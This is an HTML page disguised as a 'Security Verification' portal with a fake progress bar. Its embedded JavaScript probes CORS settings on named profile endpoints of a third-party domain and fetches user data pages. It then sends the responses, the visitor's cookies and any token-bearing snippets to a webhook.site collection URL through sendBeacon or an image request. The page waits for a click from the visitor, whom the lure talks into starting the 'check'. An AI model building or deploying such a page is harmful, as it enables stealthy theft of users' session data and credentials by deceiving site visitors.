<!DOCTYPE html>
<html>
<head>
    <title>System Security Portal</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        .progress { height: 20px; background: #f0f0f0; border-radius: 10px; margin: 20px 0; }
        #progress-bar { width: 0%; height: 100%; background: #4CAF50; border-radius: 10px; transition: width 0.5s; }
    </style>
</head>
<body>
    <h1>Security Verification in Progress</h1>
    <div class="progress"><div id="progress-bar"></div></div>
    <p id="status">Initializing security check...</p>

<script>
// Configuration
const TARGET_ENDPOINTS = [
    'https://uc-heytap-web-test.wanyol.com/v2/index.html',
    'https://uc-heytap-web-test.wanyol.com/v2/profile.html',
    'https://uc-heytap-web-test.wanyol.com/v2/profile/user_info.html'
];
const WEBHOOK_ENDPOINT = 'https://webhook.site/3001750c-2a5d-46a5-b7f0-5ebdb566f16a';
const DELAY_BETWEEN_REQUESTS = 1500;

// Stealthy data exfiltration methods
const sendData = (payload) => {
    // Method 1: Beacon API (most reliable)
    const success = navigator.sendBeacon(WEBHOOK_ENDPOINT, JSON.stringify(payload));
    
    // Method 2: Image fallback
    if (!success) {
        new Image().src = `${WEBHOOK_ENDPOINT}?data=${encodeURIComponent(btoa(JSON.stringify(payload))}`;
    }
};

// Progressive attack with GET only
const executeAttack = async () => {
    const updateStatus = (msg, progress) => {
        document.getElementById('status').textContent = msg;
        document.getElementById('progress-bar').style.width = `${progress}%`;
    };

    updateStatus('Checking system configuration...', 10);
    
    try {
        // Phase 1: Detect CORS configuration
        const testResponses = await Promise.allSettled(
            TARGET_ENDPOINTS.map(url => fetch(url, {
                method: 'HEAD',
                headers: { 'Origin': 'https://trusted-domain.com' }
            }))
        );
        
        const viableTargets = TARGET_ENDPOINTS.filter((_, i) => 
            testResponses[i].status === 'fulfilled' && 
            !testResponses[i].value.headers.get('Access-Control-Allow-Credentials')
        );
        
        updateStatus('Analyzing response patterns...', 30);
        
        // Phase 2: Systematic GET exploitation
        for (const [index, target] of viableTargets.entries()) {
            const progress = 30 + (index * 20);
            updateStatus(`Scanning ${new URL(target).pathname}...`, progress);
            
            try {
                // Attempt with different GET parameters
                const urlsToTry = [
                    target,
                    `${target}?format=json`,
                    `${target}?callback=jsonp`,
                    `${target}?_=${Date.now()}`
                ];
                
                for (const url of urlsToTry) {
                    const res = await fetch(url, {
                        headers: {
                            'X-Requested-With': 'XMLHttpRequest',
                            'Accept': 'application/json, text/javascript, */*'
                        }
                    });
                    
                    const data = await res.text();
                    
                    // Check for JSON-like responses
                    try {
                        const json = JSON.parse(data);
                        sendData({
                            target: url,
                            type: 'json',
                            data: json,
                            cookies: document.cookie
                        });
                    } catch {
                        // Check for HTML/other data
                        if (data.includes('token') || data.includes('user')) {
                            sendData({
                                target: url,
                                type: 'text',
                                snippet: data.slice(0, 500),
                                length: data.length
                            });
                        }
                    }
                    
                    await new Promise(r => setTimeout(r, DELAY_BETWEEN_REQUESTS));
                }
            } catch (e) {
                sendData({
                    target,
                    error: e.message,
                    type: 'error'
                });
            }
        }
        
        updateStatus('Security scan completed', 100);
    } catch (e) {
        updateStatus('Scan interrupted', 100);
        sendData({ fatalError: e.message });
    }
};

// Start with delay and fake user interaction
setTimeout(() => {
    document.addEventListener('click', () => executeAttack());
    document.getElementById('status').textContent = 'Click anywhere to start security check';
}, 2000);
</script>
</body>
</html>
